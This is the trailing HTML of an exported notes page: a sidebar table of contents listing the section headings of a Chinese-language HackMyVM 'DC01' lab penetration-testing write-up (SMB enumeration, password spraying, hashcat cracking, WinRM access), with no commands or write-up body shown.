			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
		</div>
		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="24-渗透\hmv\20.dc01.html#20.DC01" data-path=""><div class="tree-item-contents heading-link" heading-name="20.DC01"><span class="tree-item-title el-p" data-tag-name="p">20.DC01</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="2"><a class="tree-link" href="24-渗透\hmv\20.dc01.html#1._基本信息^toc" data-path=""><div class="tree-item-contents heading-link" heading-name="1. 基本信息^toc"><span class="tree-item-title el-ol" data-tag-name="ol">1. 
基本信息^toc
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="24-渗透\hmv\20.dc01.html#2._信息收集" data-path=""><div class="tree-item-contents heading-link" heading-name="2. 信息收集"><span class="tree-item-title el-ol" data-tag-name="ol">2. 
信息收集
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="24-渗透\hmv\20.dc01.html#3._SMB" data-path=""><div class="tree-item-contents heading-link" heading-name="3. SMB"><span class="tree-item-title el-ol" data-tag-name="ol">3. 
SMB
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="24-渗透\hmv\20.dc01.html#4._SMB密码喷射" data-path=""><div class="tree-item-contents heading-link" heading-name="4. SMB密码喷射"><span class="tree-item-title el-ol" data-tag-name="ol">4. 
SMB密码喷射
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="24-渗透\hmv\20.dc01.html#5._hashcat破解" data-path=""><div class="tree-item-contents heading-link" heading-name="5. hashcat破解"><span class="tree-item-title el-ol" data-tag-name="ol">5. 
hashcat破解
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="24-渗透\hmv\20.dc01.html#6._smb检测一下" data-path=""><div class="tree-item-contents heading-link" heading-name="6. smb检测一下"><span class="tree-item-title el-ol" data-tag-name="ol">6. 
smb检测一下
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="24-渗透\hmv\20.dc01.html#7._smbclient连接" data-path=""><div class="tree-item-contents heading-link" heading-name="7. smbclient连接"><span class="tree-item-title el-ol" data-tag-name="ol">7. 
smbclient连接
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="24-渗透\hmv\20.dc01.html#8._WinRM_连接DC01" data-path=""><div class="tree-item-contents heading-link" heading-name="8. WinRM 连接DC01"><span class="tree-item-title el-ol" data-tag-name="ol">8. 
WinRM 连接DC01
</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>